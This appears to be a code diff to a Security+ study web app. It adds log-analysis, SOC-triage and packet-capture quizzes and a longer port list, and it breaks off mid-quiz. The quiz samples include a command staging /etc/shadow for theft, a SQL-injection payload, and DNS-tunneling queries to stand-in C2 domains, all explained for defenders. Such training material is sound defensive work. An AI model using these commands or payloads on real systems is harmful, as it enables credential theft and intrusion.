@@ -338,7 +338,7 @@
       <div class="lab-info">
         <div class="lab-title">PORT NUMBER RECALL</div>
         <div class="lab-desc">Fill in port numbers for key protocols. Exam tests these cold.</div>
-        <div class="lab-meta">FILL IN · 12 PROTOCOLS · IMPLEMENTATION</div>
+        <div class="lab-meta">FILL IN · 34 PROTOCOLS · IMPLEMENTATION</div>
       </div>
       <div class="lab-difficulty diff-easy">EASY</div>
     </div>
@@ -392,6 +392,9 @@
       </div>
       <div class="lab-difficulty diff-medium">MEDIUM</div>
     </div>
+
+    <div class="lab-card" onclick="startLab('analysis')">
+      <div class="lab-icon">🔍</div>
       <div class="lab-info">
         <div class="lab-title">THREAT SCENARIO ANALYSIS</div>
         <div class="lab-desc">Read attack scenarios and identify the correct attack type, vector, and defense.</div>
@@ -399,6 +402,47 @@
       </div>
       <div class="lab-difficulty diff-hard">HARD</div>
     </div>
+
+    <div class="lab-card" onclick="startLab('logs')">
+      <div class="lab-icon">📋</div>
+      <div class="lab-info">
+        <div class="lab-title">LOG ANALYSIS LAB</div>
+        <div class="lab-desc">Read realistic security logs and identify attacks. Core SOC analyst skill tested in performance-based questions.</div>
+        <div class="lab-meta">SCENARIO · 8 LOG ENTRIES · OPERATIONS</div>
+      </div>
+      <div class="lab-difficulty diff-medium">MEDIUM</div>
+    </div>
+
+    <div class="lab-card" onclick="startLab('soc')">
+      <div class="lab-icon">🖥️</div>
+      <div class="lab-info">
+        <div class="lab-title">SOC TRIAGE SIMULATION</div>
+        <div class="lab-desc">Work a live SIEM alert queue. Triage each alert: classify, prioritize, and choose the right action. Realistic SOC workflow.</div>
+        <div class="lab-meta">SIMULATION · 6 ALERTS · OPERATIONS</div>
+      </div>
+      <div class="lab-difficulty diff-hard">HARD</div>
+    </div>
+
+    <div class="lab-card" onclick="startLab('packets')">
+      <div class="lab-icon">📡</div>
+      <div class="lab-info">
+        <div class="lab-title">PACKET CAPTURE ANALYSIS</div>
+        <div class="lab-desc">Analyze simplified network traffic captures. Identify attack signatures and anomalies from packet-level data.</div>
+        <div class="lab-meta">SCENARIO · 8 CAPTURES · THREATS DOMAIN</div>
+      </div>
+      <div class="lab-difficulty diff-hard">HARD</div>
+    </div>
+
+    <div class="lab-card" onclick="window.location.href='crypto.html'">
+      <div class="lab-icon">⚡</div>
+      <div class="lab-info">
+        <div class="lab-title">ENCRYPTION VISUALIZER</div>
+        <div class="lab-desc">Interactive live demos of AES, RSA, hashing, Diffie-Hellman, and TLS. Real cryptography running in your browser.</div>
+        <div class="lab-meta">INTERACTIVE DEMO · IMPLEMENTATION DOMAIN</div>
+      </div>
+      <div class="lab-difficulty diff-easy" style="background:rgba(138,85,255,0.15);color:#8855ff;border-color:rgba(138,85,255,0.3)">DEMO</div>
+    </div>
+
   </div>
 
   <!-- LAB DETAIL VIEW -->
@@ -435,7 +479,10 @@ function startLab(id) {
     incident: buildIncidentLab,
     analysis: buildAnalysisLab,
     cloud: buildCloudLab,
-    iam: buildIamLab
+    iam: buildIamLab,
+    logs: buildLogsLab,
+    soc: buildSocLab,
+    packets: buildPacketsLab
   };
 
   builders[id]();
@@ -480,18 +527,40 @@ function buildAttacksLab() {
 // ============================================================
 function buildPortsLab() {
   const ports = [
-    { protocol: 'FTP', port: '21', hint: '2_' },
+    { protocol: 'FTP Data', port: '20', hint: '2_' },
+    { protocol: 'FTP Control', port: '21', hint: '2_' },
     { protocol: 'SSH / SFTP', port: '22', hint: '2_' },
+    { protocol: 'Telnet', port: '23', hint: '2_' },
     { protocol: 'SMTP', port: '25', hint: '2_' },
     { protocol: 'DNS', port: '53', hint: '5_' },
+    { protocol: 'DHCP Server', port: '67', hint: '6_' },
+    { protocol: 'DHCP Client', port: '68', hint: '6_' },
+    { protocol: 'TFTP', port: '69', hint: '6_' },
     { protocol: 'HTTP', port: '80', hint: '8_' },
-    { protocol: 'HTTPS', port: '443', hint: '4__' },
-    { protocol: 'LDAP', port: '389', hint: '3__' },
-    { protocol: 'LDAPS', port: '636', hint: '6__' },
+    { protocol: 'Kerberos', port: '88', hint: '8_' },
+    { protocol: 'POP3', port: '110', hint: '1__' },
+    { protocol: 'NTP', port: '123', hint: '1__' },
+    { protocol: 'IMAP', port: '143', hint: '1__' },
     { protocol: 'SNMP', port: '161', hint: '1__' },
-    { protocol: 'RDP', port: '3389', hint: '3___' },
+    { protocol: 'SNMP Trap', port: '162', hint: '1__' },
+    { protocol: 'LDAP', port: '389', hint: '3__' },
+    { protocol: 'HTTPS', port: '443', hint: '4__' },
+    { protocol: 'SMB / CIFS', port: '445', hint: '4__' },
     { protocol: 'SMTPS', port: '465', hint: '4__' },
+    { protocol: 'IPSec / IKE', port: '500', hint: '5__' },
+    { protocol: 'Syslog (UDP)', port: '514', hint: '5__' },
+    { protocol: 'SMTP Submission', port: '587', hint: '5__' },
+    { protocol: 'LDAPS', port: '636', hint: '6__' },
     { protocol: 'IMAPS', port: '993', hint: '9__' },
+    { protocol: 'POP3S', port: '995', hint: '9__' },
+    { protocol: 'MS SQL Server', port: '1433', hint: '1___' },
+    { protocol: 'L2TP', port: '1701', hint: '1___' },
+    { protocol: 'PPTP', port: '1723', hint: '1___' },
+    { protocol: 'MySQL', port: '3306', hint: '3___' },
+    { protocol: 'RDP', port: '3389', hint: '3___' },
+    { protocol: 'SIP (VoIP)', port: '5060', hint: '5___' },
+    { protocol: 'VNC / RFB', port: '5900', hint: '5___' },
+    { protocol: 'Syslog TLS', port: '6514', hint: '6___' },
   ];
 
   let html = `
@@ -1177,6 +1246,474 @@ function checkDragDrop(labId, zoneCount) {
     ${pct < 100 ? 'Green = correct. Red = wrong placement. Retry to drill.' : 'Perfect. Every match correct.'}</div>`;
 
   document.getElementById(`ddRetry_${labId}`).style.display = 'block';
+}
+
+// ============================================================
+// LAB: LOG ANALYSIS
+// ============================================================
+function buildLogsLab() {
+  const entries = [
+    {
+      log: '[2024-11-14 09:12:34] AUTH: User jsmith logged in from 10.0.1.22 — SUCCESS',
+      question: 'What does this log entry indicate?',
+      options: ['Brute force attempt', 'Normal successful authentication', 'Privilege escalation', 'Lateral movement'],
+      correct: 1,
+      explanation: '<strong>Normal authentication</strong> — internal IP, business hours, single successful login. No threat indicators here. Baseline this behavior to detect anomalies later.'
+    },
+    {
+      log: '[2024-11-14 02:47:11] AUTH: User admin FAILED login from 185.234.91.12 — ATTEMPT 1\n[2024-11-14 02:47:12] AUTH: User admin FAILED login from 185.234.91.12 — ATTEMPT 2\n[2024-11-14 02:47:13] AUTH: User admin FAILED login from 185.234.91.12 — ATTEMPT 3',
+      question: 'What attack does this sequence indicate?',
+      options: ['Password spraying', 'Credential stuffing', 'Brute force / online password attack', 'Pass-the-hash'],
+      correct: 2,
+      explanation: '<strong>Brute force attack</strong> — rapid sequential failures against a single account from an external IP at 2 AM. Response: account lockout policies, geo-blocking, MFA. Distinguish from <strong>password spraying</strong> (one password across many accounts — slower, avoids lockout).'
+    },
+    {
+      log: '[2024-11-14 10:33:05] PROCESS: powershell.exe (PID 4482) spawned by Word.exe (PID 3318)\n[2024-11-14 10:33:06] NETWORK: PID 4482 connected to 91.198.44.201:443',
+      question: 'What does this process chain indicate?',
+      options: ['Normal Office macro behavior', 'Malicious document executing a PowerShell reverse shell', 'Windows Update process', 'Legitimate admin script'],
+      correct: 1,
+      explanation: '<strong>Malicious macro → PowerShell reverse shell</strong>. Word spawning PowerShell is a major red flag — Office documents should never launch shells. The immediate outbound connection is the C2 callback. This is a classic <strong>spear phishing payload delivery</strong> sequence. Defense: Disable macros by default, ASR rules, application allowlisting.'
+    },
+    {
+      log: '[2024-11-14 11:05:22] DNS: host 10.0.2.55 queried dGhpcyBpcyBhIGM.evil-domain.net\n[2024-11-14 11:05:23] DNS: host 10.0.2.55 queried MgBjaGFubmVs.evil-domain.net\n[2024-11-14 11:05:24] DNS: host 10.0.2.55 queried dCB0ZXN0aW5n.evil-domain.net',
+      question: 'What do these DNS queries suggest?',
+      options: ['Normal CDN traffic', 'DNS tunneling / C2 over DNS', 'DDoS amplification', 'Fast flux DNS'],
+      correct: 1,
+      explanation: '<strong>DNS Tunneling</strong> — base64-encoded data in subdomains. The high-entropy, meaningless-looking subdomain labels are characteristic. The attacker is encoding data in the subdomain portion and using DNS as a covert channel. Detection: DNS analytics, query frequency monitoring, high-entropy subdomain detection.'
+    },
+    {
+      log: '[2024-11-14 13:44:09] AUDIT: User jsmith accessed /etc/shadow — SUCCESS\n[2024-11-14 13:44:10] AUDIT: User jsmith ran: cat /etc/shadow | base64 > /tmp/.x',
+      question: 'What attack technique does this indicate?',
+      options: ['Normal sysadmin work', 'Credential dumping and staging for exfiltration', 'Password reset procedure', 'Disk integrity check'],
+      correct: 1,
+      explanation: '<strong>Credential dumping</strong> — /etc/shadow contains hashed Linux passwords. A normal user should never access it (requires root). Base64 encoding to /tmp/.x is staging for exfiltration. This indicates privilege escalation has already occurred. Response: isolate host, check how root was gained, reset all credentials.'
+    },
+    {
+      log: '[2024-11-14 14:22:55] NETWORK: 10.0.3.44 scanned 10.0.0.0/24 — 512 ports in 3 seconds\n[2024-11-14 14:22:58] NETWORK: 10.0.3.44 → 10.0.1.22:445 — SMB connection ESTABLISHED\n[2024-11-14 14:22:59] AUTH: User jsmith authenticated to 10.0.1.22 from 10.0.3.44',
+      question: 'What sequence of attack techniques is shown?',
+      options: ['Normal IT inventory scan', 'Lateral movement: internal recon → SMB → credential reuse', 'Vulnerability scan by security team', 'Backup system behavior'],
+      correct: 1,
+      explanation: '<strong>Lateral movement</strong> — internal port scan (recon), followed by SMB connection, then authentication with what may be stolen credentials (credential reuse or pass-the-hash). Attacker is moving from compromised host 10.0.3.44 toward 10.0.1.22. Key signal: internal host scanning internal subnets. Defense: network segmentation, SMB signing, privileged access workstations.'
+    },
+    {
+      log: '[2024-11-14 15:11:33] DLP: User jdoe transferred 8.4GB to USB drive — BLOCKED\n[2024-11-14 15:11:45] AUDIT: User jdoe attempted to disable Windows Defender — BLOCKED\n[2024-11-14 15:12:01] AUTH: User jdoe accessed HR database — outside authorized role',
+      question: 'What threat type does this activity profile indicate?',
+      options: ['External hacker using jdoe credentials', 'Malicious insider exfiltration attempt', 'Ransomware behavior', 'Authorized data migration'],
+      correct: 1,
+      explanation: '<strong>Malicious insider</strong> — jdoe is attempting USB exfiltration, disabling security tools, and accessing data outside their role. This is a multi-indicator insider threat profile. UEBA would flag the combination of behaviors. Response: revoke access immediately, preserve evidence, initiate HR/legal process, forensic investigation.'
+    },
+    {
+      log: '[2024-11-14 22:00:00] SCHED: Task "updater32" ran — C:\\Temp\\svchosts.exe\n[2024-11-14 22:00:01] PROCESS: svchosts.exe connected to 45.77.12.91:8443\n[2024-11-14 22:00:02] PROCESS: svchosts.exe wrote 3 files to C:\\Users\\All Users\\',
+      question: 'What persistence mechanism and behavior is shown?',
+      options: ['Legitimate Windows update', 'Scheduled task persistence + C2 beacon + file dropper', 'Antivirus signature update', 'Normal backup task'],
+      correct: 1,
+      explanation: '<strong>Scheduled task persistence + C2 beacon + dropper</strong>. "svchosts.exe" (misspelling of svchost.exe — typosquatting on a Windows process name) runs via a scheduled task at 10 PM. Immediately connects to external IP on non-standard port (8443) and writes files. Classic <strong>persistence mechanism with C2 callback</strong>. Defense: scheduled task monitoring, process name anomaly detection, outbound firewall rules.'
+    }
+  ];
+
+  let currentQ = 0;
+  let logScore = 0;
+
+  function renderLogQ(idx) {
+    const e = entries[idx];
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header">
+        <div class="lab-header-title">📋 LOG ANALYSIS LAB</div>
+        <div class="lab-header-desc">Read the security log entries and answer the question. ${idx + 1} of ${entries.length}</div>
+      </div>
+      <div style="background:#0a0e1a;border:1px solid rgba(0,255,136,0.2);border-radius:8px;padding:14px;margin:12px 0;font-family:'Share Tech Mono',monospace;font-size:12px;color:#00ff88;white-space:pre-wrap;line-height:1.6;overflow-x:auto">${e.log}</div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--text);margin:12px 0 10px"><span style="color:var(--accent-cyan)">?</span> ${e.question}</div>
+      <div id="logOpts">
+        ${e.options.map((o, i) => `<div class="answer-opt" onclick="logAnswer(${idx},${i})" style="cursor:pointer;padding:12px 14px;margin:6px 0;border:1px solid rgba(255,255,255,0.08);border-radius:6px;font-size:13px">${o}</div>`).join('')}
+      </div>
+      <div class="feedback-box" id="logFeedback" style="display:none"></div>
+      <div style="margin-top:12px;color:var(--text-dim);font-size:12px">Score: ${logScore}/${idx}</div>
+    `;
+  }
+
+  window.logAnswer = function(qIdx, selected) {
+    const e = entries[qIdx];
+    const opts = document.querySelectorAll('.answer-opt');
+    opts.forEach((o, i) => {
+      o.onclick = null;
+      o.style.cursor = 'default';
+      if (i === e.correct) o.style.cssText += ';border-color:#00ff88;background:rgba(0,255,136,0.1);';
+      if (i === selected && selected !== e.correct) o.style.cssText += ';border-color:#ff3355;background:rgba(255,51,85,0.1);';
+    });
+    if (selected === e.correct) logScore++;
+    const fb = document.getElementById('logFeedback');
+    fb.style.display = 'block';
+    fb.innerHTML = `<div class="feedback-title">${selected === e.correct ? '✓ CORRECT' : '✗ INCORRECT'}</div><div class="feedback-text">${e.explanation}</div>
+      <br><button class="action-btn green" onclick="${qIdx + 1 < entries.length ? `logNext(${qIdx + 1})` : 'logFinish()'}" style="margin-top:8px">${qIdx + 1 < entries.length ? 'NEXT LOG →' : 'VIEW RESULTS'}</button>`;
+  };
+
+  window.logNext = function(idx) { currentQ = idx; renderLogQ(idx); };
+
+  window.logFinish = function() {
+    const pct = Math.round(logScore / entries.length * 100);
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header"><div class="lab-header-title">📋 LOG ANALYSIS — COMPLETE</div></div>
+      <div class="feedback-box">
+        <div class="feedback-title">${pct >= 75 ? '✓ ANALYST PASS' : '✗ NEEDS REVIEW'}</div>
+        <div class="feedback-text">${logScore}/${entries.length} correct (${pct}%). ${pct < 75 ? 'Review the log entry types — these appear in Security+ performance-based questions.' : 'Strong analysis. You can identify attack patterns from raw logs.'}</div>
+      </div>
+      <button class="action-btn secondary" onclick="startLab('logs')" style="margin-top:12px">RETRY</button>`;
+  };
+
+  renderLogQ(0);
+}
+
+// ============================================================
+// LAB: SOC TRIAGE SIMULATION
+// ============================================================
+function buildSocLab() {
+  const alerts = [
+    {
+      id: 'ALT-001',
+      time: '03:14:22',
+      severity: 'HIGH',
+      severityColor: '#ff8800',
+      src: '185.220.101.45 (TOR Exit Node)',
+      dst: 'firewall01.corp — port 22',
+      event: '847 failed SSH login attempts in 60 seconds',
+      context: 'Source is a known TOR exit node. No prior connections from this IP. SSH exposed to internet.',
+      correctAction: 1,
+      options: ['Dismiss — SSH bruteforce is normal noise', 'ESCALATE CRITICAL — block source IP, notify IR team, audit SSH logs', 'Log and monitor — investigate tomorrow', 'Disable SSH globally'],
+      explanation: '<strong>Escalate immediately.</strong> TOR exit node + 847 attempts/min = active brute force from an anonymized attacker. SSH should not be directly internet-exposed. Actions: block source IP at perimeter, restrict SSH to VPN/jump server only, enable fail2ban/account lockout, check if any attempts succeeded.'
+    },
+    {
+      id: 'ALT-002',
+      time: '09:32:11',
+      severity: 'MEDIUM',
+      severityColor: '#ff8800',
+      src: '10.0.4.22 (workstation-mkt-07)',
+      dst: 'internal DNS server',
+      event: '2,400 DNS queries in 10 minutes — subdomains of evil-c2.net',
+      context: 'Host is a marketing workstation. No prior C2 traffic. High subdomain entropy detected.',
+      correctAction: 1,
+      options: ['Dismiss — DNS is always noisy', 'ESCALATE HIGH — isolate host, capture RAM, initiate IR', 'Block the domain and continue monitoring', 'Restart DNS service'],
+      explanation: '<strong>Escalate and isolate.</strong> High-volume DNS queries with high-entropy subdomains to an external C2 domain = DNS tunneling or malware C2 beacon. The marketing workstation is likely compromised. Critical: capture RAM (fileless malware) before isolating. Block the domain at DNS, initiate IR process.'
+    },
+    {
+      id: 'ALT-003',
+      time: '11:45:00',
+      severity: 'LOW',
+      severityColor: '#00ff88',
+      src: '10.0.1.50 (web-server-01)',
+      dst: 'updates.microsoft.com',
+      event: 'Outbound HTTPS connection — 180MB download',
+      context: 'Scheduled Windows Update window is Tuesday 11:00–12:00. This is Tuesday. Update server certificate validates.',
+      correctAction: 2,
+      options: ['ESCALATE — large outbound transfer is suspicious', 'Block Microsoft updates on servers', 'DISMISS — scheduled legitimate Windows Update within known window', 'Capture and inspect TLS traffic'],
+      explanation: '<strong>Dismiss.</strong> Scheduled update window, known-good destination with valid certificate, expected file size for a Windows Update batch. This is a true negative. Alert fatigue is real — correctly dismissing legitimate events is as important as catching real threats. Always check context before escalating.'
+    },
+    {
+      id: 'ALT-004',
+      time: '14:07:33',
+      severity: 'CRITICAL',
+      severityColor: '#ff3355',
+      src: '10.0.2.88 (fin-workstation-12)',
+      dst: 'Multiple internal hosts (10.0.0.0/16)',
+      event: 'Port scan: 65535 ports across /16 subnet in 90 seconds. Then SMB connections to 14 hosts.',
+      context: 'Finance workstation. User is an accountant. No sysadmin role. After-hours (11 PM). SMB signed disabled on targets.',
+      correctAction: 0,
+      options: ['ESCALATE CRITICAL — isolate immediately, credentials likely compromised, potential ransomware pre-staging', 'Dismiss — routine IT scan', 'Block SMB and monitor', 'Alert the user via email'],
+      explanation: '<strong>Critical — isolate immediately.</strong> Finance workstation scanning the entire network after hours and connecting via SMB = textbook ransomware pre-staging or active lateral movement. SMB signing disabled means pass-the-hash attacks are viable. Immediate isolation prevents further spread. Notify IR, check other SMB targets for signs of compromise.'
+    },
+    {
+      id: 'ALT-005',
+      time: '15:30:04',
+      severity: 'MEDIUM',
+      severityColor: '#ff8800',
+      src: 'Unknown external IP',
+      dst: '203.0.113.25 (company web server)',
+      event: "10,000 requests/min to /login — all from different IPs, passwords from known breach databases",
+      context: 'User agents vary. Each IP attempts 1–3 logins. No single IP triggers rate limits. Passwords match haveibeenpwned datasets.',
+      correctAction: 1,
+      options: ['Dismiss — distributed traffic from many IPs is normal', 'ESCALATE — credential stuffing attack in progress, enable bot protection, force MFA', 'Block all international traffic', 'Take the login page offline'],
+      explanation: '<strong>Credential stuffing attack</strong> — distributed source deliberately evades per-IP rate limits. Passwords from breach databases = automated credential testing. Actions: enable bot protection (CAPTCHA, behavioral analysis), enforce MFA for all accounts, alert users with matching breach passwords to change credentials, consider IP reputation blocking.'
+    },
+    {
+      id: 'ALT-006',
+      time: '16:52:17',
+      severity: 'HIGH',
+      severityColor: '#ff8800',
+      src: 'jdoe@company.com (user account)',
+      dst: 'Google Drive external share',
+      event: 'DLP: 4.2GB of files tagged CONFIDENTIAL uploaded and shared externally in 8 minutes',
+      context: 'jdoe is an engineer. Currently in 2-week notice period. No business justification on record. HR flagged last week.',
+      correctAction: 0,
+      options: ['ESCALATE HIGH — suspected insider exfiltration, revoke access, preserve evidence, notify legal', 'Dismiss — employees can use Google Drive', 'Send jdoe a warning email', 'Restore default DLP thresholds'],
+      explanation: '<strong>Insider threat — data exfiltration.</strong> Employee on notice period + CONFIDENTIAL data + external share = classic insider threat scenario. Actions: immediately revoke access (coordinate with HR/legal before notifying the user), preserve all logs as evidence (legal hold), investigate what was taken, notify legal team. Do NOT tip off the employee before evidence is secured.'
+    }
+  ];
+
+  let scores = new Array(alerts.length).fill(null);
+  let currentAlert = 0;
+
+  function renderSocDash() {
+    const alertList = alerts.map((a, i) => {
+      const answered = scores[i] !== null;
+      const correct = scores[i] === true;
+      return `<div class="port-row" style="flex-direction:column;align-items:stretch;padding:10px 12px;margin:6px 0;cursor:pointer;border-color:${answered ? (correct ? 'rgba(0,255,136,0.4)' : 'rgba(255,51,85,0.4)') : 'rgba(255,255,255,0.08)'}" onclick="socAlert(${i})">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
+          <div style="font-size:10px;background:rgba(${a.severity==='CRITICAL'?'255,51,85':a.severity==='HIGH'?'255,136,0':'0,255,136'},0.15);color:${a.severityColor};padding:2px 7px;border-radius:3px;font-family:'Share Tech Mono',monospace">${a.severity}</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim)">${a.time}</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim)">${a.id}</div>
+          ${answered ? `<div style="margin-left:auto;color:${correct?'#00ff88':'#ff3355'};font-size:12px">${correct?'✓':'✗'}</div>` : '<div style="margin-left:auto;color:var(--text-dim);font-size:11px">→ TRIAGE</div>'}
+        </div>
+        <div style="font-size:13px;color:var(--text)">${a.event.substring(0,80)}${a.event.length>80?'...':''}</div>
+      </div>`;
+    }).join('');
+
+    const answered = scores.filter(s => s !== null).length;
+    const correct = scores.filter(s => s === true).length;
+
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header">
+        <div class="lab-header-title">🖥️ SOC TRIAGE — ALERT QUEUE</div>
+        <div class="lab-header-desc">Triage each alert. Select the correct action. ${answered}/${alerts.length} reviewed — ${correct} correct.</div>
+      </div>
+      <div class="drag-instruction">// CLICK AN ALERT TO TRIAGE IT</div>
+      ${alertList}
+      ${answered === alerts.length ? `<button class="action-btn green" onclick="socFinish()" style="margin-top:12px">VIEW FINAL REPORT</button>` : ''}
+    `;
+  }
+
+  window.socAlert = function(idx) {
+    const a = alerts[idx];
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header">
+        <div class="lab-header-title">🖥️ ALERT ${a.id}</div>
+      </div>
+      <div style="background:#0a0e1a;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:14px;margin:10px 0;font-size:13px;line-height:1.7">
+        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
+          <span style="background:rgba(${a.severity==='CRITICAL'?'255,51,85':a.severity==='HIGH'?'255,136,0':'0,255,136'},0.15);color:${a.severityColor};padding:3px 10px;border-radius:4px;font-size:11px;font-family:'Share Tech Mono',monospace">${a.severity}</span>
+          <span style="color:var(--text-dim);font-family:'Share Tech Mono',monospace;font-size:11px">${a.time}</span>
+        </div>
+        <div><span style="color:var(--text-dim)">SOURCE:</span> ${a.src}</div>
+        <div><span style="color:var(--text-dim)">TARGET:</span> ${a.dst}</div>
+        <div style="margin-top:8px;color:var(--accent-cyan);font-family:'Share Tech Mono',monospace;font-size:12px">${a.event}</div>
+        <div style="margin-top:10px;padding-top:10px;border-top:1px solid rgba(255,255,255,0.06);color:var(--text-dim);font-size:12px">CONTEXT: ${a.context}</div>
+      </div>
+      <div style="font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text-dim);margin:10px 0 8px">// SELECT YOUR ACTION:</div>
+      ${a.options.map((o, i) => `<div class="answer-opt" onclick="socAnswer(${idx},${i})" style="cursor:pointer;padding:12px 14px;margin:6px 0;border:1px solid rgba(255,255,255,0.08);border-radius:6px;font-size:13px">${o}</div>`).join('')}
+      <div class="feedback-box" id="socFeedback" style="display:none"></div>
+      <button class="action-btn secondary" onclick="buildSocLab()" style="margin-top:10px">← BACK TO QUEUE</button>
+    `;
+  };
+
+  window.socAnswer = function(alertIdx, selected) {
+    const a = alerts[alertIdx];
+    scores[alertIdx] = selected === a.correctAction;
+    const opts = document.querySelectorAll('.answer-opt');
+    opts.forEach((o, i) => {
+      o.onclick = null;
+      o.style.cursor = 'default';
+      if (i === a.correctAction) o.style.cssText += ';border-color:#00ff88;background:rgba(0,255,136,0.1);';
+      if (i === selected && selected !== a.correctAction) o.style.cssText += ';border-color:#ff3355;background:rgba(255,51,85,0.1);';
+    });
+    const fb = document.getElementById('socFeedback');
+    fb.style.display = 'block';
+    fb.innerHTML = `<div class="feedback-title">${selected === a.correctAction ? '✓ CORRECT TRIAGE' : '✗ INCORRECT TRIAGE'}</div><div class="feedback-text">${a.explanation}</div>
+      <br><button class="action-btn green" onclick="buildSocLab()" style="margin-top:8px">← BACK TO QUEUE</button>`;
+  };
+
+  window.socFinish = function() {
+    const correct = scores.filter(s => s === true).length;
+    const pct = Math.round(correct / alerts.length * 100);
+    document.getElementById('labDetailView').innerHTML = `
+      <div class="lab-header"><div class="lab-header-title">🖥️ SOC TRIAGE — SHIFT COMPLETE</div></div>
+      <div class="feedback-box">
+        <div class="feedback-title">${pct >= 75 ? '✓ ANALYST PASS' : '✗ NEEDS REVIEW'}</div>
+        <div class="feedback-text">${correct}/${alerts.length} correct (${pct}%). ${pct < 75 ? 'Review alert triage logic — key skill for SOC roles and Security+ performance questions.' : 'Solid triage instincts. You correctly handled critical escalations and dismissed true negatives.'}</div>
+      </div>
+      <button class="action-btn secondary" onclick="startLab('soc')" style="margin-top:12px">RETRY SHIFT</button>`;
+  };
+
+  renderSocDash();
+}
+
+// ============================================================
+// LAB: PACKET CAPTURE ANALYSIS
+// ============================================================
+function buildPacketsLab() {
+  const captures = [
+    {
+      title: 'CAPTURE 1 — TCP Stream',
+      data: `SRC: 10.0.1.44:54231  →  DST: 192.168.1.100:80
+TCP [SYN]  seq=0
+TCP [SYN-ACK]  seq=0 ack=1
+TCP [ACK]  seq=1 ack=1
+HTTP GET /admin?id=1' OR '1'='1 HTTP/1.1
+HTTP/1.1 200 OK  (response: full database contents)`,
+      question: 'What attack is shown in this capture?',
+      options: ['XSS injection', 'SQL Injection via GET parameter', 'Command injection', 'Directory traversal'],
+      correct: 1,
+      explanation: "<strong>SQL Injection</strong> — the payload <code>1' OR '1'='1</code> in the id parameter breaks the SQL query logic, returning all records. The server returned 200 with database contents, confirming it worked. Defense: parameterized queries / prepared statements, input validation, WAF, principle of least privilege on DB accounts."
+    },
+    {
+      title: 'CAPTURE 2 — Network Scan',
+      data: `SRC: 10.0.5.99  →  DST: 10.0.1.0/24
+[00:00:01] 10.0.5.99 → 10.0.1.1:22   TCP [SYN] — RST received
+[00:00:01] 10.0.5.99 → 10.0.1.2:22   TCP [SYN] — RST received
+[00:00:01] 10.0.5.99 → 10.0.1.3:22   TCP [SYN] — RST received
+[00:00:01] 10.0.5.99 → 10.0.1.4:22   TCP [SYN] — SYN-ACK received ← OPEN
+[00:00:01] 10.0.5.99 → 10.0.1.4:80   TCP [SYN] — SYN-ACK received ← OPEN
+[00:00:01] 10.0.5.99 → 10.0.1.4:443  TCP [SYN] — SYN-ACK received ← OPEN
+... (continued across 254 hosts)`,
+      question: 'What activity does this traffic pattern represent?',
+      options: ['Normal TCP handshakes', 'TCP SYN port scan (network reconnaissance)', 'DDoS SYN flood', 'Legitimate load balancer health checks'],
+      correct: 1,
+      explanation: "<strong>TCP SYN scan</strong> (half-open scan) — sends SYN to each port/host. SYN-ACK = open, RST = closed. No full TCP handshake is completed (attacker sends RST after SYN-ACK). Used by Nmap by default. This is reconnaissance — the attacker is mapping the network. Detection: IDS rate-based rules, honeypots. Context matters: could be a legitimate internal vulnerability scan."
+    },
+    {
+      title: 'CAPTURE 3 — DNS Traffic',
+      data: `SRC: 10.0.2.34  →  DST: 8.8.8.8:53 (DNS)
+Query: A aGVsbG8gd29ybGQ.c2.botnet-c2.ru
+Query: A dGhpcyBpcyBleGZpbA.c2.botnet-c2.ru
+Query: A cmVhbCBkYXRh.c2.botnet-c2.ru
+Query: A dGVzdCBkYXRh.c2.botnet-c2.ru
+(2,400 queries in 10 minutes — avg 4 chars subdomain entropy: 5.8 bits/char)`,
+      question: 'What covert channel technique is in use?',
+      options: ['Normal DNS resolution', 'DNS Tunneling for C2/exfiltration', 'DNS amplification DDoS', 'Slow DNS DDoS'],
+      correct: 1,
+      explanation: "<strong>DNS Tunneling</strong> — base64/high-entropy subdomains used as a covert channel. The attacker's malware encodes data (commands or stolen data) in subdomain labels. Normal DNS queries are short and low-entropy. Defense: DNS query analytics, entropy scoring on subdomain labels, DNS firewall/RPZ (Response Policy Zone) to block known C2 domains."
+    },
+    {
+      title: 'CAPTURE 4 — ARP Traffic',
+      data: `[00:00:00] ARP: Who has 10.0.1.1? Tell 10.0.1.50 (MAC: aa:bb:cc:dd:ee:ff)
+[00:00:00] ARP: 10.0.1.1 is at 00:11:22:33:44:55 (legitimate gateway)
+[00:00:01] ARP: 10.0.1.1 is at aa:bb:cc:dd:ee:ff (ATTACKER REPLY — unsolicited)
+[00:00:01] ARP: 10.0.1.100 is at aa:bb:cc:dd:ee:ff (ATTACKER REPLY — unsolicited)
+... attacker broadcasts to entire subnet
+Result: All hosts send traffic to attacker MAC for gateway and victim`,
+      question: 'What Layer 2 attack is shown?',
+      options: ['MAC flooding', 'ARP Poisoning / ARP Spoofing', 'VLAN hopping', 'STP manipulation'],
+      correct: 1,
+      explanation: "<strong>ARP Poisoning</strong> (ARP Spoofing) — attacker sends unsolicited ARP replies mapping the gateway IP to their own MAC address. Victims update their ARP cache and send all traffic to the attacker (MitM position). No authentication in ARP — any host can claim any IP→MAC mapping. Defense: <strong>Dynamic ARP Inspection (DAI)</strong> on managed switches, static ARP entries for critical hosts, 802.1X."
+    },
+    {
+      title: 'CAPTURE 5 — HTTPS Traffic Analysis',
+      data: `SRC: 10.0.3.55  →  DST: 185.44.77.12:443
+[09:00:00] TLS ClientHello → connection established (28 bytes)
+[09:00:30] TLS data → 31 bytes
+[10:00:00] TLS data → 29 bytes
+[11:00:00] TLS data → 33 bytes
+[12:00:00] TLS data → 28 bytes
+[13:00:00] TLS data → 30 bytes
+Pattern: 28-33 byte transmissions every ~60 minutes, 24 hours/day
+Destination: recently registered domain, no reputation`,
+      question: 'What does this encrypted traffic pattern indicate?',
+      options: ['Normal HTTPS web browsing', 'C2 beacon over HTTPS — regular check-in intervals', 'Encrypted backup software', 'Antivirus cloud lookup'],
+      correct: 1,
